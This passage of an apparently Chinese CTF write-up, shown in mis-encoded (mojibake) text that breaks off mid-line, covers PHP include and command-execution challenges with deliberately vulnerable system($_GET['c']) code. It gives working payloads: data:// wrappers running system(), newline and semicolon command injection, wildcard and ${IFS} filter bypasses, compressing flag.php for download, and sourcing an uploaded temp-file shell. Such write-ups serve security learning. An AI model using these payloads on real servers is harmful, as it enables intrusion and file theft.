title="include(c)"></a>include(c)</h2><p>data://ï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„ data://æµä¼šè¢«å½“ä½œ php æ–‡ä»¶æ‰§è¡Œ</p><blockquote><p>data://text/plain,&lt;?php system(ls)?&gt;</p><p>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>ä¹Ÿå¯ä»¥åŒ…å«æ—¥å¿—æ–‡ä»¶ æŠ“åŒ… åœ¨ UA æˆ–è€…å¤´éƒ¨è®¿é—®ä¸€å¥è¯å³ä¸å­˜åœ¨çš„èµ„æº æ”¾åŒ… ç„¶ååŒ…å«å³å¯</p><h2 id="system-c"><a href="#system-c" class="headerlink" title="system(c)"></a>system(c)</h2><ul><li>å›æ˜¾ä¸¢è¿›é»‘æ´</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ shell å‘½ä»¤æ—¶ï¼Œä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶</p><table><thead><tr><th align="center">ç±»å‹</th><th align="center">æ–‡ä»¶æè¿°ç¬¦</th><th align="center">æ‰§è¡Œæƒ…å†µ</th><th align="center">å¥æŸ„ä½ç½®</th></tr></thead><tbody><tr><td align="center">æ ‡å‡†è¾“å…¥</td><td align="center">0</td><td align="center">ä»é”®ç›˜ä¼šçš„è¾“å…¥</td><td align="center">/proc/self/fd/0</td></tr><tr><td align="center">æ ‡å‡†è¾“å‡º</td><td align="center">1</td><td align="center">è¾“å‡ºåˆ°æ§åˆ¶å°</td><td align="center">/proc/self/fd/1</td></tr><tr><td align="center">é”™è¯¯è¾“å‡º</td><td align="center">2</td><td align="center">è¾“å‡ºåˆ°æ§åˆ¶å°</td><td align="center">/proc/self/fd/2</td></tr></tbody></table><ol><li>è¾“å‡º</li></ol><table><thead><tr><th align="center">å‘½ä»¤</th><th align="center">ä»‹ç»</th></tr></thead><tbody><tr><td align="center">command &gt;filename</td><td align="center">æŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–°æ–‡ä»¶ä¸­</td></tr><tr><td align="center">command 1&gt;filename</td><td align="center">åŒä¸Š</td></tr><tr><td align="center">command &gt;&gt;filename</td><td align="center">æŠŠæ ‡å‡†è¾“å‡ºè¿½åŠ åˆ°æ–‡ä»¶ä¸­</td></tr><tr><td align="center">command 1&gt;&gt;filename</td><td align="center">åŒä¸Š</td></tr><tr><td align="center">command 2&gt;filename</td><td align="center">æŠŠæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ–°æ–‡ä»¶ä¸­</td></tr><tr><td align="center">command 2&gt;&gt;filename</td><td align="center">æŠŠæ ‡å‡†é”™è¯¯è¿½åŠ åˆ°æ–°æ–‡ä»¶ä¸­</td></tr></tbody></table><blockquote><p>å‡å¦‚æ›´æ”¹æ–‡ä»¶æè¿°ç¬¦çš„æŒ‡å‘ï¼Œå°±èƒ½é‡å®šå‘è¾“å…¥è¾“å‡ºã€‚æ¯”å¦‚æˆ‘ä»¬å°† 1 æŒ‡å‘æ–‡ä»¶ï¼Œé‚£ä¹ˆæ ‡å‡†çš„è¾“å‡ºå°±ä¼šè¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚</p><p>ä½¿ç”¨&gt;æˆ–è€…&gt;&gt;å¯¹<strong>è¾“å‡º</strong>è¿›è¡Œé‡å®šå‘ã€‚ç¬¦å·çš„å·¦è¾¹è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœæ²¡æœ‰çš„è¯è¡¨ç¤º 1ï¼Œä¹Ÿå°±æ˜¯æ ‡å‡†è¾“å‡ºï¼Œç¬¦å·çš„å³è¾¹å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªè¾“å‡ºè®¾å¤‡ã€‚å½“ä½¿ç”¨&gt;æ—¶ï¼Œä¼šåˆ¤æ–­å³è¾¹çš„æ–‡ä»¶å­˜ä¸å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±è¦†ç›–ï¼Œä¸å­˜åœ¨çš„è¯åˆ™ç›´æ¥åˆ›å»ºã€‚ä½†æ˜¯å½“ä½¿ç”¨&gt;&gt;è¿›è¡Œè¿½åŠ æ—¶ï¼Œåˆ™ä¸ä¼šåˆ é™¤åŸæ¥å·²ç»å­˜åœ¨çš„æ–‡ä»¶ã€‚</p><p>root@en1sksyfamnufy5g:~/Desktop# tree<br>.<br>â””â”€â”€ a.txt</p><p>0 directories, 1 file<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt<br>ls: cannot access â€˜b.txtâ€™: No such file or directory<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ^C<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>åœ¨æˆ‘ä»¬æ‰§è¡Œ<code>ls a.txt b.txt</code>ä¹‹åï¼Œä¸€å…±æœ‰ä¸¤ç§è¾“å‡ºï¼Œå…¶ä¸­<code>ls:</code>æ— æ³•è®¿é—® b.txt: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•æ˜¯é”™è¯¯è¾“å‡ºï¼Œa.txt æ˜¯æ ‡å‡†è¾“å‡ºã€‚</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 1&gt;out<br>ls: cannot access â€˜b.txtâ€™: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;&gt;out<br>ls: cannot access â€˜b.txtâ€™: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>å°†åŸæ¥çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°äº† out æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æ§åˆ¶å°åªå‰©ä¸‹äº†é”™è¯¯æç¤ºã€‚å¹¶ä¸”å½“æ‰§è¡Œäº†è¿½åŠ æ“ä½œæ—¶ï¼Œout æ–‡ä»¶çš„å†…å®¹éä½†æ²¡æœ‰è¢«æ¸…ç©ºï¼Œåè€Œåˆå¤šäº†ä¸€æ¡ a.txtã€‚ä¸‹é¢æˆ‘ä»¬å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ä¸­ï¼š</p><p>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt 2&gt;err<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access â€˜b.txtâ€™: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop# ls a.txt b.txt &gt;out 2&gt;err<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat err<br>ls: cannot access â€˜b.txtâ€™: No such file or directory<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><ol start="2"><li>è¾“å…¥</li></ol><table><thead><tr><th align="center">å‘½ä»¤</th><th align="center">ä»‹ç»</th></tr></thead><tbody><tr><td align="center">command &lt;filename</td><td align="center">ä»¥ filename æ–‡ä»¶ä½œä¸ºæ ‡å‡†è¾“å…¥</td></tr><tr><td align="center">command 0&lt;filename</td><td align="center">åŒä¸Š</td></tr><tr><td align="center">command &lt;&lt;delimiter</td><td align="center">ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥ï¼Œç›´åˆ°é‡åˆ° delimiter åˆ†éš”ç¬¦</td></tr></tbody></table><blockquote><p>ä½¿ç”¨&lt;å¯¹<strong>è¾“å…¥</strong>åšé‡å®šå‘ï¼Œå¦‚æœç¬¦å·å·¦è¾¹æ²¡æœ‰å†™å€¼ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯ 0ã€‚ä»¥ cat å‘½ä»¤ä¸ºä¾‹ï¼Œå¦‚æœ cat åé¢æ²¡æœ‰è·Ÿæ–‡ä»¶åçš„è¯ï¼Œé‚£å®ƒçš„ä½œç”¨å°±æ˜¯å°†æ ‡å‡†è¾“å…¥ï¼ˆæ¯”å¦‚é”®ç›˜ï¼‰å›æ˜¾åˆ°æ ‡å‡†è¾“å‡ºï¼ˆæ¯”å¦‚å±å¹•ï¼‰ä¸Šï¼š</p><p>root@en1sksyfamnufy5g:~/Desktop# cat<br>123<br>123<br>test<br>test</p><p>è®© cat è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ©ç”¨è¾“å…¥é‡å®šå‘ï¼š</p><p>root@en1sksyfamnufy5g:~/Desktop# cat a.txt<br>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;a.txt<br>root@en1sksyfamnufy5g:~/Desktop# cat out<br>hello<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸Šä¸€æ¬¡çš„ cat out çš„å†…å®¹æ˜¯ a.txt</p><p>root@en1sksyfamnufy5g:~/Desktop# cat &gt;out &lt;&lt;end</p><p>&gt;hhh<br>&gt;end<br>root@en1sksyfamnufy5g:~/Desktop#</p><p>å½“æˆ‘ä»¬è¾“å…¥å®Œ<code>cat &gt;out &lt;&lt;end</code>ï¼Œç„¶åæ•²ä¸‹å›è½¦ä¹‹åï¼Œå‘½ä»¤å¹¶æ²¡æœ‰ç»“æŸï¼Œæ­¤æ—¶ cat å‘½ä»¤åƒä¸€å¼€å§‹ä¸€æ ·ï¼Œç­‰å¾…ä½ ç»™å®ƒè¾“å…¥æ•°æ®ã€‚ç„¶åå½“æˆ‘ä»¬æ•²å…¥ end ä¹‹åï¼Œcat å‘½ä»¤å°±ç»“æŸäº†ã€‚end ä¹‹å‰è¾“å…¥çš„å­—ç¬¦éƒ½å·²ç»è¢«å†™å…¥åˆ°äº† out æ–‡ä»¶ä¸­ã€‚è¿™å°±æ˜¯è¾“å…¥åˆ†å‰²ç¬¦çš„ä½œç”¨ã€‚</p></blockquote><p>å›åˆ°<code>&gt;/dev/null 2&gt;&amp;1</code> å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†</p><p><code>&gt;/dev/null</code></p><p>è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯å°†æ ‡å‡†è¾“å‡º 1 é‡å®šå‘åˆ°<code>/dev/null</code>ä¸­ã€‚ <code>/dev/null</code>ä»£è¡¨ linux çš„ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œæ‰€æœ‰å¾€è¿™ä¸ªæ–‡ä»¶é‡Œé¢å†™å…¥çš„å†…å®¹éƒ½ä¼šä¸¢å¤±ï¼Œä¿—ç§°â€œé»‘æ´â€ã€‚é‚£ä¹ˆæ‰§è¡Œäº†<code>&gt;/dev/null</code>ä¹‹åï¼Œæ ‡å‡†è¾“å‡ºå°±ä¼šä¸å†å­˜åœ¨ï¼Œæ²¡æœ‰ä»»ä½•åœ°æ–¹èƒ½å¤Ÿæ‰¾åˆ°è¾“å‡ºçš„å†…å®¹ã€‚</p><p><code>2&gt;&amp;1</code></p><p>è¿™æ¡å‘½ä»¤ç”¨åˆ°äº†é‡å®šå‘ç»‘å®šï¼Œé‡‡ç”¨&amp;å¯ä»¥å°†ä¸¤ä¸ªè¾“å‡ºç»‘å®šåœ¨ä¸€èµ·ã€‚è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯é”™è¯¯è¾“å‡ºå°†å’Œæ ‡å‡†è¾“å‡ºåŒç”¨ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¯´äººè¯å°±æ˜¯é”™è¯¯è¾“å‡ºå°†ä¼šå’Œæ ‡å‡†è¾“å‡ºè¾“å‡ºåˆ°åŒä¸€ä¸ªåœ°æ–¹ã€‚</p><p>linux åœ¨æ‰§è¡Œ shell å‘½ä»¤ä¹‹å‰ï¼Œå°±ä¼šç¡®å®šå¥½æ‰€æœ‰çš„è¾“å…¥è¾“å‡ºä½ç½®ï¼Œå¹¶ä¸”ä»å·¦åˆ°å³ä¾æ¬¡æ‰§è¡Œé‡å®šå‘çš„å‘½ä»¤ï¼Œæ‰€ä»¥<code>&gt;/dev/null 2&gt;&amp;1</code>çš„ä½œç”¨å°±æ˜¯è®©æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°<code>/dev/null</code>ä¸­ï¼ˆä¸¢å¼ƒæ ‡å‡†è¾“å‡ºï¼‰ï¼Œç„¶åé”™è¯¯è¾“å‡ºç”±äºé‡ç”¨äº†æ ‡å‡†è¾“å‡ºçš„æè¿°ç¬¦ï¼Œæ‰€ä»¥é”™è¯¯è¾“å‡ºä¹Ÿè¢«å®šå‘åˆ°äº†<code>/dev/null</code>ä¸­ï¼Œé”™è¯¯è¾“å‡ºåŒæ ·ä¹Ÿè¢«ä¸¢å¼ƒäº†ã€‚æ‰§è¡Œäº†è¿™æ¡å‘½ä»¤ä¹‹åï¼Œè¯¥æ¡ shell å‘½ä»¤å°†ä¸ä¼šè¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°æ§åˆ¶å°ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•ä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚</p><p>å›åˆ°é¢˜ç›®ï¼Œæˆ‘ä»¬çŸ¥é“%0a æ˜¯æ¢è¡Œ é‚£ä¹ˆæ„é€  payload å¦‚ï¼š</p><blockquote><p>?c=cat flag.php%0a</p></blockquote><p>åœ¨ç»ˆç«¯å°±ä¼šè¿™æ ·</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php<br>flag{â€¦â€¦}<br>root@en1sksyfamnufy5g:~/Desktop# &gt;/dev/null 2&gt;&amp;1<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><p>è¿˜å¯ä»¥åˆ©ç”¨åˆ†å·</p><blockquote><p>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt<br>hello</p><p>all seems fine<br>root@en1sksyfamnufy5g:~/Desktop# tac 1.txt<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop# cat 1.txt;tac 1.txt<br>hello</p><p>all seems fine<br>all seems fine</p><p>hello<br>root@en1sksyfamnufy5g:~/Desktop#</p></blockquote><p>payloadï¼š</p><blockquote><p>?c=cat flag.php;ls</p><p>è¿™æ ·å‘½ä»¤å°±æˆä¸º</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php;ls &gt;/dev/null 2&gt;&amp;1</p><p>â€¦</p></blockquote><p>è¿˜æœ‰<code>||</code> <code>&amp;&amp;</code></p><ul><li>è¿‡æ»¤äº†å¤§é‡å‘½ä»¤</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ul><li><code>/bin</code>: bin ä¸º binary çš„ç®€å†™ä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tar ç­‰ã€‚</li><li><code>/usr/bin</code>:ä¸» è¦æ”¾ç½®ä¸€äº›åº”ç”¨è½¯ä½“å·¥å…·çš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚ c++ã€g++ã€gccã€chdrvã€diffã€digã€duã€ejectã€elmã€freeã€gnome*ã€ gzipã€htpasswdã€kfmã€ktopã€lastã€lessã€localeã€m4ã€makeã€manã€mcopyã€ncftpã€ newaliasesã€nslookup passwdã€quotaã€smb*ã€wget ç­‰ã€‚</li><li><code>/sbin</code>: ä¸» è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹å¼ä¾‹å¦‚:cfdiskã€dhcpcdã€dumpã€e2fsckã€fdiskã€haltã€ifconfigã€ifupã€ ifdownã€initã€insmodã€liloã€lsmodã€mke2fsã€modprobeã€quotacheckã€rebootã€rmmodã€ runlevelã€shutdown ç­‰ã€‚</li><li><code>/usr/sbin</code>:æ”¾ç½®ä¸€äº›ç½‘è·¯ç®¡ç†çš„å¿…å¤‡ç¨‹å¼ä¾‹å¦‚:dhcpdã€httpdã€imapã€in.*dã€inetdã€lpdã€namedã€netconfigã€nmbdã€sambaã€sendmailã€squidã€swapã€tcpdã€tcpdump ç­‰ã€‚</li></ul></blockquote><p>æ‰€ä»¥åˆ©ç”¨é€šé…ç¬¦å°±å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚ cat</p><blockquote><p>?c=/bin/ca?${IFS}f???????</p></blockquote><p>å½“ç„¶è¿˜æœ‰æ¼ç½‘ä¹‹é±¼å¯ä»¥åˆ©ç”¨</p><blockquote><p>grep${IFS}show${IFS}fla?.php</p></blockquote><ul><li>è¿‡æ»¤æ‰€æœ‰å°å†™å­—æ¯</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>â… ã€å¦‚ä¸Šæ‰€è¿°ï¼Œå¯ä»¥åˆ©ç”¨<code>ç›®å½•+é€šé…ç¬¦åŒ¹é…ç‰¹æ®Šå«æ•°å­—å‘½ä»¤</code>ç»•è¿‡æ­£åˆ™å¯¹å‡½æ•°çš„åŒ¹é… ç°åœ¨æ˜¯å°å†™å­—æ¯ä¸èƒ½å‡ºç°ï¼Œåœ¨ bin ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ° base64</p><blockquote><p>ä¸‹é¢ä¸¤ç§ç”¨æ³•ç­‰ä»·ï¼š</p><p>root@en1sksyfamnufy5g:~/Desktop# base64 flag.php</p><p>root@en1sksyfamnufy5g:~/Desktop# cat flag.php | base64</p></blockquote><p>payload:</p><blockquote><p>?c=/???/????64 flag.php</p></blockquote><p>åœ¨/usr/bin ä¸‹å¯ä»¥æ‰¾åˆ° bzip2ï¼Œå…ˆå°† flag.php æ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œç„¶åå†å°†å…¶ä¸‹è½½</p><blockquote><p>?c=/???/???/???2 flag.php</p><p>curl -O http://â€¦/flag.php.bz2</p></blockquote><ul><li>æ— å­—æ¯æ•°å­—</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>â…¡ã€åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶</p><p>å¯ä»¥å‘ php ä¸Šä¼ ä¸€ä¸ª shell æ–‡ä»¶ï¼Œphp ä¼šå°†å…¶ä¿å­˜ä¸º<code>/tmp/phpxxxxxx</code>æ–‡ä»¶åæœ€å 6 ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯</p><p>å¯ä»¥åˆ©ç”¨é€šé…ç¬¦<code>/???/php??????</code> <code>/*/?????????</code>æˆ–<code>/???/?????????</code>ä½†æ˜¯è¿™ç§åŒ¹é…çš„å‡†ç¡®æ€§ä¸é«˜</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"></p><p>æˆ‘ä»¬åŠ å…¥å‡†ç¡®æ€§æ›´é«˜çš„æ­£åˆ™åŒ¹é… å¯è§åªæœ‰ä¸´æ—¶æ–‡ä»¶åŒ…å«æœ‰å¤§å†™å­—æ¯</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell</a></p><p>æ„é€ ä¸´æ—¶æ–‡ä»¶æœ€åä¸€ä½æ˜¯å¤§å†™çš„ payload<code>/???/?????????[@-[]</code></p><p>(php ç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png"></p><blockquote><p>source å‘½ä»¤ï¼š</p><p>source å‘½ä»¤ä¹Ÿç§°ä¸ºâ€œç‚¹å‘½ä»¤â€ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‚¹ç¬¦å·ï¼ˆ.ï¼‰ã€‚</p><p>source å‘½ä»¤é€šå¸¸ç”¨äºé‡æ–°æ‰§è¡Œåˆšä¿®æ”¹çš„åˆå§‹åŒ–æ–‡ä»¶ï¼Œä½¿ä¹‹ç«‹å³ç”Ÿæ•ˆï¼Œè€Œä¸å¿…æ³¨é”€å¹¶é‡æ–°ç™»å½•ã€‚</p><p>ç”¨æ³•ï¼š</p><p>source filename æˆ– . filename</p><p>source å‘½ä»¤é™¤äº†ä¸Šè¿°çš„ç”¨é€”ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå¦å¤–ä¸€ä¸ªç”¨é€”ã€‚åœ¨å¯¹ç¼–è¯‘ç³»ç»Ÿæ ¸å¿ƒæ—¶å¸¸å¸¸éœ€è¦è¾“å…¥ä¸€é•¿ä¸²çš„å‘½ä»¤ï¼Œå¦‚ï¼š</p><p>make mrproper</p><p>make menuconfig</p><p>make dep</p><p>make clean</p><p>make bzImage</p><p>â€¦â€¦â€¦â€¦</p><p>å¦‚æœæŠŠè¿™äº›å‘½ä»¤åšæˆä¸€ä¸ªæ–‡ä»¶ï¼Œè®©å®ƒè‡ªåŠ¨é¡ºåºæ‰§è¡Œï¼Œå¯¹äºéœ€è¦å¤šæ¬¡åå¤ç¼–è¯‘ç³»ç»Ÿæ ¸å¿ƒçš„ç”¨æˆ·æ¥è¯´ä¼šå¾ˆæ–¹ä¾¿ï¼Œè€Œç”¨ source å‘½ä»¤å°±å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯æŠŠä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹å½“æˆ shell æ¥æ‰§è¡Œï¼Œå…ˆåœ¨ linux çš„æºä»£ç ç›®å½•ä¸‹ï¼ˆå¦‚/usr/src/linux-2.4.20ï¼‰å»ºç«‹ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ make_commandï¼Œåœ¨å…¶ä¸­è¾“å…¥ä¸€ä¸‹å†…å®¹ï¼š</p><p>make mrproper &amp;&amp;</p><p>make menuconfig &amp;&amp;</p><p>make dep &amp;&amp;</p><p>make clean &amp;&amp;</p><p>make bzImage &amp;&amp;</p><p>make modules &amp;&amp;</p><p>make modules_install &amp;&amp;</p><p>cp arch/i386/boot/bzImage /boot/vmlinuz_new &amp;&amp;</p><p>cp System.map /boot &amp;&amp;</p><p>vi /etc/lilo.conf &amp;&amp;</p><p>lilo -v</p><p>æ–‡ä»¶å»ºç«‹å¥½ä¹‹åï¼Œæ¯æ¬¡ç¼–è¯‘æ ¸å¿ƒçš„æ—¶å€™ï¼Œåªéœ€è¦åœ¨/usr/src/linux-2.4.20 ä¸‹è¾“å…¥ï¼š</p><p>source make_command</p><p>å³å¯ï¼Œå¦‚æœä½ ç”¨çš„ä¸æ˜¯ lilo æ¥å¼•å¯¼ç³»ç»Ÿï¼Œå¯ä»¥æŠŠæœ€åä¸¤è¡Œå»æ‰ï¼Œé…ç½®è‡ªå·±çš„å¼•å¯¼ç¨‹åºæ¥å¼•å¯¼å†…æ ¸ã€‚</p><p>é¡ºä¾¿è¡¥å……ä¸€ç‚¹ï¼Œ&amp;&amp;å‘½ä»¤è¡¨ç¤ºé¡ºåºæ‰§è¡Œç”±å®ƒè¿æ¥çš„å‘½ä»¤ï¼Œä½†æ˜¯åªæœ‰å®ƒä¹‹å‰çš„å‘½ä»¤æˆåŠŸæ‰§è¡Œå®Œæˆäº†ä¹‹åæ‰å¯ä»¥ç»§ç»­æ‰§è¡Œå®ƒåé¢çš„å‘½ä»¤ã€‚</p><p>é€šè¿‡<code>.</code>å»æ‰§è¡Œ sh å‘½ä»¤ä¸éœ€è¦æœ‰æ‰§è¡Œæƒé™</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815112747397.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815112814014.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210815115542123.png"></p><p>èƒ½å¦ä½¿ç”¨ sess ä¸Šä¼ è¿›åº¦</p><ul><li>shell æ•°å­—æ„é€ </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>shell ä¸‹å„å˜é‡çš„å«ä¹‰</p><p>${_} =â€â€ 